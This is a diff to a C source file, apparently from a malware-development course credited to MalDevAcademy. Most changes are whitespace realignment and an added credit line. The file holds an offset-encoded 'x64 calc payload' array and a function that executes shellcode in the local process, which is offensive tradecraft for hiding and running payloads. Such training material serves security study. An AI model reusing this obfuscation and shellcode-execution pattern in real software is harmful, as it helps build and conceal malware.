@@ -1,9 +1,9 @@
+// @NUL0x4C | @mrd0x : MalDevAcademy
+
 #include <Windows.h>
 #include <stdio.h>
 
-
 // x64 calc payload
-
 DWORD dwOffsetsArray[276] = {
 		
 		778, 824, 607, 724, 892, 779, 1036, 12, 12, 12, 551, 602, 551, 453, 556, 602,
@@ -48,9 +48,9 @@ VOID PrintHexArray(IN CONST CHAR* cArrayName, IN PBYTE pBufferData, IN SIZE_T sB
 
 BOOL ReadFileFromDiskW(IN LPCWSTR szFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {
 
-	HANDLE		hFile					= INVALID_HANDLE_VALUE;
-	DWORD		dwFileSize				= NULL,
-				dwNumberOfBytesRead		= NULL;
+	HANDLE		hFile				= INVALID_HANDLE_VALUE;
+	DWORD		dwFileSize			= NULL,
+			dwNumberOfBytesRead		= NULL;
 	PBYTE		pBaseAddress			= NULL;
 
 	if (!szFileName || !pdwFileSize || !ppFileBuffer)
@@ -76,8 +76,8 @@ BOOL ReadFileFromDiskW(IN LPCWSTR szFileName, OUT PBYTE* ppFileBuffer, OUT PDWOR
 		goto _END_OF_FUNC;
 	}
 
-	*ppFileBuffer = pBaseAddress;
-	*pdwFileSize = dwFileSize;
+	*ppFileBuffer 	= pBaseAddress;
+	*pdwFileSize 	= dwFileSize;
 
 _END_OF_FUNC:
 	if (hFile != INVALID_HANDLE_VALUE)
@@ -90,9 +90,9 @@ _END_OF_FUNC:
 
 BOOL ExecuteShellcodeInLocalProcess(IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT OPTIONAL PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {
 
-	PBYTE		pAddress			= NULL;
+	PBYTE		pAddress		= NULL;
 	DWORD		dwOldProtection		= 0x00;
-	HANDLE		hThread				= NULL;
+	HANDLE		hThread			= NULL;
 
 	if (!pShellcodeAddress || !sShellcodeSize)
 		return FALSE;
